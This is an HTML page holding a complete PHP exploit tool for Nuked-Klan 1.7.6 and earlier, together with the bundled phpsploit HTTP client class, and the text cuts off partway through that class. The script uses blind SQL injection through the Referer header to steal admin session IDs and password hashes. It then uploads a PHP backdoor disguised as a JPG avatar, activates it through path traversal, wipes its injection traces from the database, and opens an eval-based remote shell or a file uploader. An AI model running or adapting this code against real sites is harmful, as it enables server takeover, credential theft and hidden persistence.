<html><head><title>Nuked-Klan <= 1.7.6 Multiple Vulnerabilities Exploit</title></head><pre>&lt;?php

/*
 * Name: Nuked-Klan &lt;= 1.7.6 Multiple Vulnerabilities Exploit
 * Credits: Charles &quot;real&quot; F. &lt;charlesfol[at]hotmail.fr&gt;
 * URL: http://realn.free.fr/releases/46556
 * Date: 04-01-08
 *
 * -&gt; Remote Code Execution
 * -&gt; Remote File Upload
 * -&gt; Admin Hash Extraction
 *
 * Remote Code Exec vulnerability used in
 * this exploit was discovered by DarkFig.
 */

print &quot;\n&quot;;
print &quot;  Nuked-Klan &lt;= 1.7.6 Multiple Vulnerabilities Exploit\n&quot;;
print &quot;    by Charles \&quot;real\&quot; F. &lt;charlesfol[at]hotmail.fr&gt;\n\n\n&quot;;

if($argc&lt;3)
{
	print &quot; usage: ./nk_exploit.php -url &lt;url&gt; [options]\n\n&quot;;
	print &quot; Options: -mode    0 -&gt; Remote Upload (default)\n&quot;;
	print &quot;                   1 -&gt; Remote Code Execution\n&quot;;
	print &quot;                   2 -&gt; Admin Hash Extraction\n&quot;;
	print &quot;          -admin   If you have an admin account.\n&quot;;
	print &quot;          -user    If STATS page needs registration,\n&quot;;
	print &quot;                   you can set an account.\n&quot;;
	print &quot;          -proxy   If you want to use a proxy.\n&quot;;
	print &quot;          -prefix  Cookie prefix (default: nuked_).\n&quot;;
	print &quot;          -file    If you wanna upload a specific file\n&quot;;
	print &quot;                   else it will upload a simple uploader.\n&quot;;
	print &quot;\n&quot;;
	print &quot; eg: ./nk_exploit.php -url http://localhost/nk/ -admin real:passw0rd\n&quot;;
	print &quot; eg: ./nk_exploit.php -url http://localhost/nk/ -file cshell.php -proxy localhost:8118\n\n&quot;;
	die();
}
 
$url  = getparam(&quot;url&quot;,1);
$mode = getparam(&quot;mode&quot;) ? getparam(&quot;mode&quot;): 0;
$adm  = getparam(&quot;admin&quot;);
$acc  = getparam(&quot;user&quot;);
$prx  = getparam(&quot;proxy&quot;);

$prefix = getparam(&quot;prefix&quot;) ? getparam(&quot;prefix&quot;) : &quot;nuked_&quot;;

$file_upload_code = getparam(&quot;file&quot;) ? file_get_contents(getparam(&quot;file&quot;)) : '&lt;?php if(isset($_POST[\'upload\'])) { if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], &quot;./&quot;.$_FILES[\'file\'][\'name\'])) echo(&quot;&lt;center&gt;Error &quot;.$_FILES[\'file\'][\'error\'].&quot;&lt;/center&gt;&quot;);else echo &quot;&lt;center&gt;File uploaded&lt;/center&gt;&quot;; } ?&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;center&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;Upload&quot;&gt;&lt;/center&gt;&lt;/form&gt;';;

$date = array(date('Y'),date('m'),date('d'));

$xpl = new phpsploit();
if($prx) $xpl-&gt;proxy($prx);

/* Admin account defined */
if($adm)
{
	print &quot;[*] Using admin account $adm\n&quot;;
	list($login,$passwd) = explode(&quot;:&quot;,$adm);
	$xpl-&gt;addheader(&quot;Referer&quot;,$url);
	$c = $xpl-&gt;post($url.&quot;index.php?file=User&amp;{$prefix}nude=index&amp;op=login&quot;,&quot;pseudo=$login&amp;pass=$passwd&amp;remember_me=ok&quot;);
	if(preg_match(&quot;#{$prefix}sess_id=([a-z0-9]+)#i&quot;,$c,$sid) &amp;&amp; preg_match(&quot;#uid=([a-z0-9]+)#i&quot;,$c,$uid))
	{
		$admin_sid = $sid[1];
		$admin_uid = $uid[1];
		print &quot;      SID -&gt; $admin_sid\n&quot;;
		print &quot;      UID -&gt; $admin_uid\n&quot;;
		finalattack($admin_sid,$admin_uid);
	} else exit(&quot;[*] Can't log in\n&quot;);
}
/* Admin account not defined */
else
{	
	/* User account defined */
	if($acc)
	{
		print &quot;[*] Using user account $acc\n&quot;;
		list($login,$passwd) = explode(&quot;:&quot;,$acc);
		$xpl-&gt;addheader(&quot;Referer&quot;,$url);
		$c = $xpl-&gt;post($url.&quot;index.php?file=User&amp;nuked_nude=index&amp;op=login&quot;,&quot;pseudo=$login&amp;pass=$passwd&amp;remember_me=ok&quot;);
		if(preg_match(&quot;#{$prefix}sess_id=([a-z0-9]+)#i&quot;,$c,$sid) &amp;&amp; preg_match(&quot;#uid=([a-z0-9]+)#i&quot;,$c,$uid))
		{
			# User Cookies
			$xpl-&gt;addcookie(&quot;{$prefix}sess_id&quot;,$sid[1]);
			$xpl-&gt;addcookie(&quot;{$prefix}user_id&quot;,$uid[1]);
		} else exit(&quot;[*] Can't log in\n&quot;);
	}

	$queries   = array();
	$queries[] = array(&quot;     SID&quot;,&quot;SELECT id FROM nuked_sessions WHERE user_id=(SELECT id FROM {$prefix}users WHERE niveau&gt;=9 ORDER BY date LIMIT 0,1) LIMIT 0,1&quot;);
	$queries[] = array(&quot;     UID&quot;,&quot;SELECT id FROM nuked_users WHERE niveau&gt;=9 LIMIT 0,1&quot;);
	$queries[] = array(&quot;   Login&quot;,&quot;SELECT pseudo FROM nuked_users WHERE niveau&gt;=9 LIMIT 0,1&quot;);
	$queries[] = array(&quot;Password&quot;,&quot;SELECT pass FROM nuked_users WHERE niveau&gt;=9 LIMIT 0,1&quot;);
	
	$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);
	$xpl-&gt;addheader(&quot;X-Forwarded-For&quot;,&quot;127.0.0.1&quot;);
	
	$ctmp = $xpl-&gt;get($url.&quot;index.php?file=Stats&amp;page=visits&quot;);
	
	if(preg_match('#&lt;a href=&quot;javascript:history.back\(\)&quot;&gt;&lt;b&gt;[^&lt;]+&lt;/b&gt;#i',$ctmp)) exit(&quot;[*] You don't have rights to access Stats page.\n&quot;);
	if(preg_match('#&lt;a href=&quot;index.php\?file=User&amp;amp;op=login_screen&quot;&gt;[^&lt;]+&lt;/a&gt; | &lt;a href=&quot;index.php\?file=User&amp;amp;op=reg_screen&quot;&gt;[^&lt;]+&lt;/a&gt;#i',$ctmp)) exit(&quot;[*] You must be registered, use -user param.\n&quot;);
	$xpl-&gt;reset(&quot;header&quot;);
	$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);
	
	attack1();
	attack2();
}

function getparam($param,$opt='')
{
	global $argv;
	foreach($argv as $value =&gt; $key)
	{
		if($key == '-'.$param) return $argv[$value+1];
	}
	if($opt) exit(&quot;\n-$param parameter required&quot;);
	else return;
}

/* --- Attack #1 ---------------------------------------- */

function attack1()
{
	global $queries,$mode;
	
	print &quot;[*] Attack #1\n&quot;;
	
	if($mode != 2)
	{
		print &quot; &quot;.$queries[0][0].&quot; -&gt; &quot;;
		$admin_sid = sql_session_query($queries[0][1],0);
		
		if(!$admin_sid) return false;
		
		if($admin_sid==&quot;&quot;)
		{
			print &quot;\r[*] No session found. Crack following MD5 hash and use -admin param.\n&quot;;
			for($i=2;$i&lt;4;$i++)
			{
				print &quot; &quot;.$queries[$i][0].&quot; -&gt; &quot;;
				sql_user_query($queries[$i][1]);
			}
			exit();
		}
		else
		{
			print &quot;\n &quot;.$queries[1][0].&quot; -&gt; &quot;;
			$admin_uid = sql_session_query($queries[1][1]);
			finalattack($admin_sid,$admin_uid);
		}
	}
	else
	{
			print &quot;\r[*] Getting admin credentials\n&quot;;
			for($i=2;$i&lt;4;$i++)
			{
				print &quot; &quot;.$queries[$i][0].&quot; -&gt; &quot;;
				$z = sql_user_query($queries[$i][1]);
				if(!$z || $z == &quot;&quot;) return false;
			}
			exit();
	}
}

function attack1_init()
{
	global $xpl,$url;

	$rnd = rand(100000,999999);
	
	$xpl-&gt;reset(&quot;header&quot;);
	$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);
	$xpl-&gt;addheader(&quot;X-Forwarded-For&quot;,&quot;255.255.255.255&quot;);
	$xpl-&gt;addheader(&quot;Referer&quot;,&quot;http://g00gle.com','1','1','$rnd','1','1') #&quot;);
	$xpl-&gt;get($url.&quot;index.php&quot;);
	
	return $rnd;
}

function sql_session_query($query,$z=1)
{
	$result = '';
	$rnd = attack1_init();
	$size = 20;
	for($i=1;$i&lt;=$size;$i++)
	{
		$r = get_ord($query,$i,$rnd);
		if(!$r) break;
		$result .= chr($r);
		print chr($r);
	}
	if($z==1) print &quot;\n&quot;;
	return $result;
}

function sql_user_query($query)
{
	$result = '';
	for($i=1;$i&lt;=50;$i++)
	{
		$r = get_ord($query,$i,attack1_init());
		if(!$r) break;
		$result .= chr($r);
		print chr($r);
	}
	print &quot;\n&quot;;
	return $result;
}

function get_ord($query,$a,$rnd)
{
	global $xpl,$url;
	
	$xpl-&gt;reset(&quot;header&quot;);
	$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);
	$xpl-&gt;addheader(&quot;X-Forwarded-For&quot;,&quot;255.255.255.255&quot;);
	$xpl-&gt;addheader(&quot;Referer&quot;,&quot;http://g00gle.com','1',CONCAT({$a}000,ORD(MID(($query),$a,1))),'$rnd','1','1') #&quot;);
	$content = $xpl-&gt;get($url.&quot;index.php?file=Stats&amp;page=visits&amp;oyear=$rnd&amp;omonth=1&quot;);
	preg_match('#&lt;option[^&gt;]*&gt;'.$a.'000(\d+)&lt;/option&gt;[^:]*&lt;/select&gt; /#i',$content,$res);

	if(!isset($res[1]) &amp;&amp; $a==1)
	{
		print &quot;\r&quot;;
		print &quot;[*] Attack failed.\n\n&quot;;
		return false;
	}
	if(!isset($res[1])) return &quot;&quot;;
	return $res[1];
}

/* --- Attack #2 ---------------------------------------- */

function attack2()
{
	global $queries,$mode,$admin_sid,$admin_uid;
	
	print &quot;[*] Attack #2\n&quot;;
	
	if($mode != 2)
	{
		print &quot; &quot;.$queries[0][0].&quot; -&gt; &quot;;
		$admin_sid = blind($queries[0][1],20,48,122);
		
		if($admin_sid==&quot;&quot;)
		{
			print &quot;\r[*] No session found. Crack following MD5 hash and use -admin param.\n&quot;;
			for($i=2;$i&lt;4;$i++)
			{
				print &quot; &quot;.$queries[$i][0].&quot; -&gt; &quot;;
				blind($queries[$i][1],50,48,122);
				print &quot;\n&quot;;
			}
			exit();
		}
		else
		{
			print &quot;\n &quot;.$queries[1][0].&quot; -&gt; &quot;;
			$admin_uid = blind($queries[1][1],20,48,122);
			print &quot;\n&quot;;
			finalattack($admin_sid,$admin_uid);
		}
	}
	else
	{
			print &quot;\r[*] Getting admin credentials\n&quot;;
			for($i=2;$i&lt;4;$i++)
			{
				print &quot; &quot;.$queries[$i][0].&quot; -&gt; &quot;;
				blind($queries[$i][1],50,48,122);
				print &quot;\n&quot;;
			}
			exit();
	}
}

function blind($query,$nbchars,$from,$to)
{
	global $xpl,$url,$date;
	
	$result = &quot;&quot;;
	$current_letter	= 1;
	
	/* let's test first if there is a value ... */

	$ip  =  &quot;82.237.&quot;.rand(1,10).&quot;.&quot;.rand(1,250);
	$rnd =  rand(100,1000000);
	$q = preg_replace(&quot;#(\w*) FROM #i&quot;,&quot;COUNT($1) FROM &quot;,$query,1);
	$sql = &quot;http://g00gle$rnd.com' OR ($q)&gt;0 #&quot;;
	
	$xpl-&gt;reset(&quot;header&quot;);
	$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);
	$xpl-&gt;addheader(&quot;X-Forwarded-For&quot;,$ip);
	$xpl-&gt;addheader(&quot;Referer&quot;,&quot;$sql&quot;);
	$c=$xpl-&gt;get($url.&quot;index.php?file=Stats&amp;nuked_nude=visits&amp;op=view_referer&amp;oyear=$date[0]&amp;omonth=$date[1]&amp;oday=$date[2]&quot;);
	if(!preg_match('#g00gle'.$rnd.'[^&gt;]+&lt;/a&gt;&lt;/td&gt;[\r\t\n]*&lt;td[^&gt;]*&gt;[1-9]\d* \(\d+%\)&lt;/td&gt;#',$xpl-&gt;getcontent(),$matches)) return false;
	
	while($current_letter&lt;=$nbchars)
	{
		$add=$from;
		for($i=intval(($to-$from)/2);$i&gt;1;$i=intval($i/2))
		{
			if(get($query,&quot;&gt;&quot;,$current_letter,$add+$i)) $add+=$i+1;
		}
		
		for($ord=$add;;$ord++)
		{
			if(get($query,&quot;=&quot;,$current_letter,$ord))
			{
				print strtolower(chr($ord));
				$result .= strtolower(chr($ord));
				break;
			}
			elseif($ord==$add+$i+3) return $result;
		}
		
		$current_letter++;
	}
	
	return $result;
}

function get($query,$sign,$d,$f)
{
	global $xpl,$url,$date;
	
	while(true)
	{
		$ip  =  &quot;82.237.&quot;.rand(1,10).&quot;.&quot;.rand(1,250);
		$rnd =  rand(100,1000000);
		$sql = &quot;http://g00gle$rnd.com' OR ORD(MID(($query),$d,1))$sign$f #&quot;;
		
		$xpl-&gt;reset(&quot;header&quot;);
		$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);
		$xpl-&gt;addheader(&quot;X-Forwarded-For&quot;,$ip);
		$xpl-&gt;addheader(&quot;Referer&quot;,&quot;$sql&quot;);
		$c=$xpl-&gt;get($url.&quot;index.php?file=Stats&amp;nuked_nude=visits&amp;op=view_referer&amp;oyear=$date[0]&amp;omonth=$date[1]&amp;oday=$date[2]&quot;);
		if(preg_match('#g00gle'.$rnd.'[^&gt;]+&lt;/a&gt;&lt;/td&gt;[\r\t\n]*&lt;td[^&gt;]*&gt;[1-9]\d* \(\d+%\)&lt;/td&gt;#',$xpl-&gt;getcontent(),$matches)) return true;
		if(preg_match('#g00gle'.$rnd.'#',$xpl-&gt;getcontent())) break;
	}
	
	return false;
}

function finalattack($admin_sid,$admin_uid)
{
	global $url,$xpl,$mode,$prefix,$file_upload_code;
	
	print &quot;\n[*] Admin status confirmed.\n&quot;;

	# Admin Cookies
	$xpl-&gt;reset(&quot;cookie&quot;);
	$xpl-&gt;addcookie(&quot;{$prefix}sess_id&quot;,$admin_sid);
	$xpl-&gt;addcookie(&quot;{$prefix}user_id&quot;,$admin_uid);
	$xpl-&gt;addcookie(&quot;{$prefix}admin_session&quot;,$admin_uid);
	
	print &quot;[*] Uploading fake image ... &quot;;

	/* Code in the fake avatar */
	if($mode==0)	/* upload code */
	{
	$c0de =	 '&lt;?php'.&quot;\n&quot;
			.&quot;error_reporting(0);&quot;
			.&quot;if(isset(\$_SERVER['HTTP_UPLOAD'])) { \$f=fopen('w00t.php','w');fputs(\$f,'&quot;.preg_replace(&quot;#'#i&quot;,&quot;\\'&quot;,$file_upload_code).&quot;');print 'upfiledone'; }\n&quot;
			.'include(\'./Includes/blocks/block_login.php\');$blok[type]=\'login\'; ?&gt;';
	}
	else		/* shell code */
	{
	$c0de =	 '&lt;?php'.&quot;\n&quot;
			.'error_reporting(0);'
			.'if(isset($_SERVER[HTTP_SHELL]))'
			.'{print 123456789;eval($_SERVER[HTTP_SHELL]);exit(123456789);}'
			.'else {include(\'./Includes/blocks/block_login.php\');$blok[type]=\'login\';} ?&gt;';
	}

	/* This is based on DarkFig's code (http://mgsdl.free.fr/?1:30) */
	/* It was a little changed to permit 2 modes: upload/code exec  */

	$phpc = array(
	frmdt_url   =&gt; $url.'?file=User&amp;op=update_pref',
	'fichiernom' =&gt; array(frmdt_filename =&gt; '1.jpg',
	frmdt_content =&gt; $c0de));

	$xpl-&gt;addheader('Referer',$url);
	$xpl-&gt;formdata($phpc);
	
	$f = fopen(&quot;zzz.jpg&quot;,&quot;w&quot;);
	fputs($f,$c0de);
	fclose($f);
	
	$xpl-&gt;get($url.'?file=User&amp;op=edit_pref');

	if(!preg_match('#\&lt;input name=\&quot;photo\&quot; value=\&quot;(\S+)\&quot;#',$xpl-&gt;getcontent(),$match)) exit(&quot;error.\n&quot;);
	
	print &quot;done.\n&quot;;
	
	print &quot;[*] Processing SQL queries ... &quot;;
	
	$sql   = array();
	$sql[] = &quot;ALTER TABLE nuked_block CHANGE `type` `type` VARCHAR(60) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL DEFAULT 0;&quot;;
	$sql[] = &quot;UPDATE nuked_block SET type=&quot;.char('/../../../'.$match[1].&quot;\x00&quot;).&quot; WHERE bid=1;&quot;;
	$sql[] = &quot;DELETE FROM nuked_stats_visitor WHERE referer LIKE 0x25673030676c6525;&quot;; /* added by real to delete our SQL Injection from SQL DB */
	$sql[] = &quot;DELETE FROM nuked_nbconnecte;&quot;;

	for($i=0;$i&lt;count($sql);$i++)
		$xpl-&gt;post($url.'?file=Admin&amp;page=mysql&amp;op=upgrade_db','upgrade='.$sql[$i]);
		
	print &quot;done.\n&quot;;

	/* Final step: File Upload or Code Execution */
	if($mode==0)	/* Upload */
	{
		$xpl-&gt;addheader(&quot;Upload&quot;,&quot;1&quot;);
		$c = $xpl-&gt;get($url);
		if(preg_match(&quot;#upfiledone#i&quot;,$c)) print &quot;[*] File uploaded.\n\n&quot;;
		else exit(&quot;[*] File upload error.\n&quot;);
		print &quot;[*] &quot;.$url.&quot;w00t.php\n&quot;;
	}
	else			/* Shell */
	{
		print &quot;\n\$shell&gt; &quot;;
		while(!preg_match(&quot;#^(quit|exit)$#&quot;,($cmd = trim(fgets(STDIN)))))
		{
			$xpl-&gt;reset('header');
			$xpl-&gt;addheader('Shell',&quot;system('$cmd');&quot;);
			$xpl-&gt;get($url);
			$data = explode('123456789',$xpl-&gt;getcontent());
			print $data[1].&quot;\n\$shell&gt; &quot;;
		}
	}
	
	/* End of DarkFig based code */
	
	exit();
}

function char($data)
{
       $char='CHAR(';
       for($i=0;$i&lt;strlen($data);$i++)
       {
               $char .= ord($data[$i]);
               if($i != (strlen($data)-1)) $char .= ',';
       }
       return $char.')';
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 5 (remove &quot;private&quot;, &quot;public&quot; if you have PHP 4)
 * VERSION:        1.2
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this-&gt;proxyhost) &amp;&amp; !empty($this-&gt;proxyport)) $socket = fsockopen($this-&gt;proxyhost,$this-&gt;proxyport);
		else $socket = fsockopen($this-&gt;host,$this-&gt;port);
		
		if(!$socket) die(&quot;Error: The host doesn't exist&quot;);
		
		if($this-&gt;method===&quot;get&quot;) $this-&gt;packet = &quot;GET &quot;.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		elseif($this-&gt;method===&quot;post&quot; or $this-&gt;method===&quot;formdata&quot;) $this-&gt;packet = &quot;POST &quot;.$this-&gt;url. &quot; HTTP/1.1\r\n&quot;;
		else die(&quot;Error: Invalid method&quot;);
		
		if(!empty($this-&gt;proxyuser)) $this-&gt;packet .= &quot;Proxy-Authorization: Basic &quot;.base64_encode($this-&gt;proxyuser.&quot;:&quot;.$this-&gt;proxypass).&quot;\r\n&quot;;
		$this-&gt;packet .= &quot;Host: &quot;.$this-&gt;host.&quot;\r\n&quot;;
		
		if(!empty($this-&gt;agent))  $this-&gt;packet .= &quot;User-Agent: &quot;.$this-&gt;agent.&quot;\r\n&quot;;
		if(!empty($this-&gt;header)) $this-&gt;packet .= $this-&gt;header.&quot;\r\n&quot;;
		if(!empty($this-&gt;cookie)) $this-&gt;packet .= &quot;Cookie: &quot;.$this-&gt;cookie.&quot;\r\n&quot;;
		
		$this-&gt;packet .= &quot;Connection: Close\r\n&quot;;
		if($this-&gt;method===&quot;post&quot;)
		{
			$this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$this-&gt;packet .= &quot;Content-Length: &quot;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;;
		}
		elseif($this-&gt;method===&quot;formdata&quot;)
		{
			$this-&gt;packet .= &quot;Content-Type: multipart/form-data; boundary=---------------------------&quot;.$this-&gt;boundary.&quot;\r\n&quot;;
			$this-&gt;packet .= &quot;Content-Length: &quot;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data;
		}
		$this-&gt;packet .= &quot;\r\n&quot;;
		$this-&gt;recv = '';
		
		fputs($socket,$this-&gt;packet);
		while(!feof($socket)) $this-&gt;recv .= fgets($socket);
		fclose($socket);
		
		if($this-&gt;cookiejar) $this-&gt;cookiejar($this-&gt;getheader($this-&gt;recv));
		if($this-&gt;allowredirection) return $this-&gt;allowredirection($this-&gt;recv);
		else return $this-&gt;recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;name=newvalue&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;othername=overvalue; xx=zz; y=u&quot;);
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv='')
	{
		// $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;); work avec replace
		if(!empty($cookv))
		{
			if($cookv === &quot;deleted&quot;) $cookv=''; // cookiejar(1) &amp;&amp; Set-Cookie: name=delete
			if(!empty($this-&gt;cookie))
			{
			    if(preg_match(&quot;/$cookn=/&quot;,$this-&gt;cookie))
			    {
			    	$this-&gt;cookie = preg_replace(&quot;/$cookn=(\S*);/&quot;,&quot;$cookn=$cookv;&quot;,$this-&gt;cookie);
			    }
			    else
			    {
			    	$this-&gt;cookie .= &quot; &quot;.$cookn.&quot;=&quot;.$cookv.&quot;;&quot;; // &quot; &quot;.
			    }
			}
			else
			{
				$this-&gt;cookie = $cookn.&quot;=&quot;.$cookv.&quot;;&quot;;
			}
		}
		// $this-&gt;addcookie(&quot;name=value; othername=othervalue&quot;);
		else
		{
	    	 if(!empty($this-&gt;cookie))
	    	 {
	    	 	$cookn = preg_replace(&quot;/(.*);$/&quot;,&quot;$1&quot;,$cookn);
	    	 	$cookarr = explode(&quot;;&quot;,str_replace(&quot; &quot;, &quot;&quot;,$cookn));
	    	 	for($i=0;$i&lt;count($cookarr);$i++)
	    	 	{
	    	 		preg_match(&quot;/(\S*)=(\S*)/&quot;,$cookarr[$i],$matches);
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this-&gt;addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===&quot;;&quot;) ? $cookn : $cookn.&quot;;&quot;;
			 	$this-&gt;cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this-&gt;addheader(&quot;headername&quot;,&quot;headervalue&quot;);
	 * or
	 * $this-&gt;addheader(&quot;headername: headervalue&quot;);
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue='')
	{
		// $this-&gt;addheader(&quot;name&quot;,&quot;value&quot;);
		if(!empty($headervalue))
		{
			if(!empty($this-&gt;header))
			{
				if(preg_match(&quot;/$headern:/&quot;,$this-&gt;header))
				{
					$this-&gt;header = preg_replace(&quot;/$headern: (\S*)/&quot;,&quot;$headern: $headervalue&quot;,$this-&gt;header);
				}
				else
				{
					$this-&gt;header .= &quot;\r\n&quot;.$headern.&quot;: &quot;.$headervalue;
				}
			}
			else
			{
				$this-&gt;header=$headern.&quot;: &quot;.$headervalue;
			}
		}
		// $this-&gt;addheader(&quot;name: value&quot;);
		else 
		{
			if(!empty($this-&gt;header))
			{
				$headarr = explode(&quot;: &quot;,$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this-&gt;addheader($headern,$headerv);
			}
			else
			{
				$this-&gt;header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this-&gt;proxy(&quot;proxyip&quot;,&quot;8118&quot;);
	 * or
	 * $this-&gt;proxy(&quot;proxyip:8118&quot;)
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp='')
	{
		// $this-&gt;proxy(&quot;localhost:8118&quot;);
		if(empty($proxyp))
		{
			preg_match(&quot;/^(\S*):(\d+)$/&quot;,$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this-&gt;proxyhost=$proxh;
			$this-&gt;proxyport=$proxp;
		}
		// $this-&gt;proxy(&quot;localhost&quot;,8118);
		else 
		{
			$this-&gt;proxyhost=$proxy;
			$this-&gt;proxyport=intval($proxyp);
		}
		if($this-&gt;proxyport &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;dapasswd&quot;);
	 * or
	 * $this-&gt;proxyauth(&quot;darkfig:dapasswd&quot;);
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this-&gt;proxyauth(&quot;darkfig:password&quot;);
		if(empty($proxypasse))
		{
			preg_match(&quot;/^(.*):(.*)$/&quot;,$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this-&gt;proxyuser=$proxu;
			$this-&gt;proxypass=$proxp;
		}
		// $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;password&quot;);
		else
		{
			$this-&gt;proxyuser=$proxyauth;
			$this-&gt;proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the &quot;User-Agent&quot; header.
	 * Several methods are possible to do that:
	 * 
	 * $this-&gt;agent(&quot;Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent: Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent&quot;,&quot;Mozilla Firefox&quot;);
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this-&gt;agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this-&gt;showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this-&gt;header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this-&gt;showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this-&gt;cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this-&gt;showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this-&gt;packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * GET method. You can precise the port of the host.
	 * 
	 * $this-&gt;get(&quot;http://localhost&quot;);
	 * $this-&gt;get(&quot;http://localhost:888/xd/tst.php&quot;);
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;get&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * POST method. You can precise the port of the host.
	 * 
	 * $this-&gt;post(&quot;http://localhost/index.php&quot;,&quot;admin=1&amp;user=dark&quot;);
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;post&quot;;
		$this-&gt;data=$data;
		return $this-&gt;sock();
	}
	

	/**
	 * This function sends the formed http packet with the
	 * POST method using the multipart/form-data enctype. 
	 * 
	 * $array = array(
	 *          frmdt_url      =&gt; &quot;http://localhost/upload.php&quot;,
	 *          frmdt_boundary =&gt; &quot;123456&quot;,                    # Optional
	 *                 &quot;email&quot; =&gt; &quot;me@u.com&quot;,
	 *               &quot;varname&quot; =&gt; array(
	 *                            frmdt_type =&gt; &quot;image/gif&quot;,   # Optional
	 *                       frmdt_transfert =&gt; &quot;binary&quot;,      # Optional
	 *                        frmdt_filename =&gt; &quot;hello.php&quot;,
	 *                         frmdt_content =&gt; &quot;&lt;?php echo ':)'; ?&gt;&quot;));
	 * $this-&gt;formdata($array);
	 *
	 * @param array $array
	 * @return $server_response
	 */
	public function formdata($array)
	{
		$this-&gt;target($array[frmdt_url]);
